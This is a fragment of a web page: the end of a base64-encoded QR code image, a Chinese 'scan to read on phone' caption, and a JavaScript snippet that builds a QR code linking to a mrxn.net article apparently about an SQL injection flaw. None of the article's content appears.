Om39Ph9jnyF9gGm30epizDnq585EeKRr7Bqt6Fvq22vzT9Da/RB9qMumi/cDUTTie85gd27LLdR06qQi5ApQ7A8FRAOQf0dYc5XbYU+mPNdh+N8+SA5CJb2KCC+Wn8b95pcQXwQjHq5PsEQDZ6ja1zaB9xrzyekHc676XiX5fTE1cbMi5Dpyntd1zuH1FvX8+od9R2hXnOQNSBoXoToEFS3vmPPd77y6xO7r/j5hHg6H4LjNQRyd8Br6P5rqhUrDulnHsKrZhsQHYL6t566VhchfkDpZax+R2ED4Po6seLqHWGuMw+zDuFwx/MJ8bQ+BMdAju6UI+3ZviHT7j6Ibk/zMOs9r2+F+gtXnpUOWbvn4VjXB8lDUF2svVTIxdIqOi/NGAPRdOJ7T2A3EMjUYcbVNiE+8066c3U49kN0CHY/RLcvhMMe9XTsPXse0utVfeWD9IHgM982vxvINnle//wJ/NhAYL5bYOZ+6d7FcvGZXvnuhaxRuQqYeWkVEL3X/y2vXhXWrbA824CsD5y/7b182Mf/9oTAfcrA+O0uRN/eEXXtOUDynUP08lZAuL7SKuSvYPkrure0CnWY11IvTwUkX9cVEA7B0ipWdeoQv7zwfxtINTvj+yewG0hN9ihWS+l9lofcDRBc+bsOs9/1YNZ73ZZDvDCjHohu747dt+LPdPOi68gLdwMp8Yz3ncAYCOQugcf4bKtOHeY+6tZ3rt6x+yB9u76tg+ee8sPsg/DKVUA4BEvbxmoPK91aSD8IqheOgRQ54/0ncA7k/TOYdvAfAAAA///qrvOLAAAABklEQVQDAFx1/uBPtl+EAAAAAElFTkSuQmCC)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/amttgroup-get\_user\_enrollment-userid-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 